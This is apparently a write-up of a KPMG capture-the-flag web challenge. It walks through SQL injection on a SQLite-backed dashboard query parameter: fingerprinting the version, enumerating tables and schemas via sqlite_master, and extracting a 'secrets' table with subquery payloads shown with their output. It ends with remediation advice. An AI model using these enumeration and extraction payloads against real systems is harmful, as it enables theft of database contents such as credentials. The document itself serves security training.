# KPMG CTF — DevNote

## 1\. Challenge Overview

**Challenge Name:** Dev Query Interface  
**Category:** Web Exploitation / SQL Injection  
**Target:** `/dashboard?q=`  
**Database:** SQLite 3.46.1  
**Objective:** Identify the vulnerability in the developer query interface and retrieve the challenge flag.

### Description

The application displayed a dashboard with the following notice:

> Only admin should have access to sensitive data.

It also exposed a developer query interface through the `q` parameter. Initial testing revealed that the application evaluated SQL-compatible expressions and returned their results. This behavior enabled further investigation of the underlying SQLite database, including its schema and stored records.

## 2\. Initial Reconnaissance

The first step was to examine how the query interface processed different types of input.

### Test 1: String input

**Input:**

```sql
hello
```

**Observed result:**

```text
no such column: hello
```

The error suggested that the input was being interpreted as a SQL identifier rather than ordinary text.

### Test 2: Numeric expression

**Input:**

```sql
1
```

**Observed result:**

```text
\\\[{'1': 1}]
```

The application successfully evaluated the expression.

### Test 3: Arithmetic evaluation

**Input:**

```sql
1+1
```

**Observed result:**

```text
\\\[{'1+1': 2}]
```

The successful evaluation confirmed that the interface accepted SQL-compatible expressions.

## 3\. Database Fingerprinting

To identify the database engine and version, the following expression was submitted.

**Payload:**

```sql
sqlite\\\_version()
```

**Observed result:**

```text
\\\[{'sqlite\\\_version()': '3.46.1'}]
```

The result identified SQLite version 3.46.1 as the database engine.

## 4\. Database Enumeration

The next objective was to identify the database tables.

### Payload

```sql
(SELECT group\\\_concat(name)
 FROM sqlite\\\_master
 WHERE type='table')
```

**Observed result:**

```text
users,secrets
```

Two tables were discovered:

* `users`
* `secrets`

The `secrets` table was particularly relevant because the challenge explicitly mentioned sensitive data.

## 5\. Schema Enumeration

The schemas of both tables were retrieved from SQLite's metadata.

### Users table

**Payload:**

```sql
(SELECT sql
 FROM sqlite\\\_master
 WHERE type='table'
 AND name='users')
```

**Observed result:**

```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT,
    password TEXT
)
```

The `users` table contained an identifier, username, and password field.

### Secrets table

**Payload:**

```sql
(SELECT sql
 FROM sqlite\\\_master
 WHERE type='table'
 AND name='secrets')
```

**Observed result:**

```sql
CREATE TABLE secrets (
    id INTEGER PRIMARY KEY,
    data TEXT
)
```

The `secrets` table contained an identifier and a `data` column. This provided a clear lead for retrieving the challenge's target data.

## 6\. Flag Retrieval

After identifying the table and its column, a scalar subquery was used to retrieve the stored data.

**Payload:**

```sql
(SELECT group\\\_concat(data, ' | ')
 FROM secrets)
```

**Observed result:**

```text
KPMG\\\_CTF{-DqixSrYePy-klkiykZzMQQx8CQ1vOZmRaYP4V4Nj92F}
```

**Flag:**

`KPMG\\\_CTF{-DqixSrYePy-klkiykZzMQQx8CQ1vOZmRaYP4V4Nj92F}`

The flag was successfully retrieved from the database.

## 7\. Vulnerability Analysis

The observed behavior is consistent with an unsafe SQL query interface that allowed user-controlled input to be evaluated as SQL expressions.

The testing demonstrated that the interface could:

1. Evaluate SQL-compatible expressions.
2. Access SQLite database metadata.
3. Discover table names and schemas.
4. Execute scalar subqueries against application tables.
5. Retrieve sensitive data without demonstrating an administrator authorization check.

The likely security issues are **SQL injection or unsafe SQL expression evaluation**, combined with a potential **broken access control** vulnerability.

The exact root cause requires reviewing the server-side implementation. The available results alone do not establish whether the application used string concatenation, deliberately exposed arbitrary SQL evaluation, or another unsafe query-construction technique.

## 8\. Security Impact

The demonstrated impact was unauthorized disclosure of the challenge flag.

Depending on the application's database contents and permissions, similar behavior could expose:

* Usernames and password-related data.
* Application secrets and sensitive records.
* Database structure and internal metadata.
* Other information accessible through the database connection.

The presence of a warning about administrator-only access does not enforce authorization. Access restrictions must be implemented on the server.

## 9\. Recommended Remediation

### A. Remove arbitrary SQL evaluation

The application should not accept unrestricted SQL expressions from users. Replace the developer query interface with predefined, explicitly supported operations.

### B. Use parameterized queries

For normal data access, use parameterized SQL statements rather than concatenating user input into query strings.

Example using Python's SQLite interface:

```python
username = request.args.get("username", "")

result = db.execute(
    "SELECT id, username FROM users WHERE username = ?",
    (username,)
).fetchall()
```

Parameterization protects values in supported query positions. It is not a safe way to implement an interface that intentionally executes arbitrary SQL supplied by users.

### C. Enforce server-side authorization

Sensitive endpoints should verify authentication and administrator privileges before returning restricted data. Hiding dashboard controls or displaying a warning is insufficient.

### D. Restrict database access

Limit access to sensitive tables and database files wherever the application architecture permits. Avoid returning password fields or other confidential information through general-purpose endpoints.

### E. Improve error handling and testing

Return generic errors to clients, log diagnostics securely, and add regression tests to ensure that arbitrary expressions are rejected and non-administrative users cannot access sensitive records.

## 10\. Key Learnings

This challenge demonstrated a methodical approach to investigating a suspicious web query interface:

* Identify how input is interpreted.
* Fingerprint the database engine.
* Enumerate database metadata.
* Inspect table schemas.
* Retrieve the intended challenge data.
* Explain the vulnerability's impact and remediation.

The most important lesson is that **SQL execution and authorization are separate security concerns**. Preventing unsafe query construction is essential, but sensitive data must also be protected by explicit server-side access controls.

## Conclusion

The challenge was solved by identifying SQL-compatible expression evaluation in the developer query interface, fingerprinting SQLite, enumerating the `users` and `secrets` tables, inspecting the `secrets` schema, and retrieving the flag through a scalar subquery.

The findings highlight the risks of exposing unrestricted query functionality in a web application, especially when sensitive records are accessible without a verified authorization boundary.

